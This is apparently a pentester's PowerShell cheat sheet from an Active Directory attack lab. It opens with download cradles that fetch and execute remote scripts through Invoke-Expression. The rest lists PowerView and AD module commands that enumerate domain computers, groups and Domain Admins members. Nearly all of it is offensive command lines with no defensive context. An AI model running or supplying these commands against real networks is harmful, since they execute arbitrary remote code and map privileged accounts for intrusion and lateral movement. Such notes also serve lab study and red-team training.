### run remote scripts

```
$wr = [system.net.webrequest]::create('<uri>')
$r = $wr.getresponse()
iex ([system.io.streamreader]($r.getresponsestream())).readtoend()
```

```
iex (new-object net.webclient).downloadstring('<uri>')
iex (iwr '<uri>') // invoke-webrequest - iwr
``` 

### get computers in a domain

Powerview
```
get-netcomputer
get-netcomputer -fulldata
get-netcomputer -fulldata | where-object {$_.name -eq "dcorp-std41"}
get-netcomputer -fulldata -name "dcorp-std41"
get-netcomputer -operatingsystem "*server 2016*"
```

admodule
```
get-adcomputer -filter *
get-adcomputer -filter * | select dnshostname
get-adcomputer -identity "dcorp-std41" -properties *
```

### get groups

Powerview
```
get-netgroup
get-netgroup -domain <domain>
get-netgroup -fulldata
get-netgroup 'domain admins' -fulldata  | select member
get-netgroup "*admin*"
```

admodule
```
get-adgroup -identity 'domain admins'
get-adgroup -filter * -properties *
get-adgroup -filter 'name -like "*admin*"'
```

### get group members

Powerview
```
get-netgroupmember -groupname "domain admins"
```